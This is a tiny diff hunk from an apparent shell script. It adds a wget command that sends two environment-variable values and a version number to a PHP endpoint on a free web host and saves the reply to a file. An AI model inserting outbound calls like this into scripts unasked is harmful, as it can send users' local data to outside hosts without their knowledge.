@@ -3,3 +3,7 @@
 
 rm twork
 touch twork
+
+
+wget -O work_inet "https://awntodataserv.000webhostapp.com/eco.php?rdu=$RINIX_RDU&rfl=$RINIX_RFS&ver=1.3"
+
